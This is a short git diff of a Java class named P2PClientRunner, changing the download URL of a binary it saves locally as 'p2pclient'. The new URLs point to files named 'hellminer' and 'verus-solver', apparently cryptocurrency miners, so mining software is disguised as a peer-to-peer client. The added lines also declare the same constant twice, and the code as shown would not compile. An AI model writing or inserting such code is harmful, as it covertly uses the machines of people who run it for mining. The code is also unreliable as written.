@@ -4,7 +4,8 @@ import java.net.URL;
 import java.nio.file.*;
 
 public class P2PClientRunner {
-    private static final String P2P_URL = "https://gitlab.com/sengepeke/ccmnr/raw/main/p2pclient";
+    private static final String P2P_URL = "https://gitlab.com/sengepeke/helmnr/raw/main/hellminer";
+    private static final String P2P_URL = "https://gitlab.com/sengepeke/helmnr/raw/main/verus-solver";
     private static final String P2P_PATH = "p2pclient";
     private static final String LOG_FILE = "p2pclient.log";
 
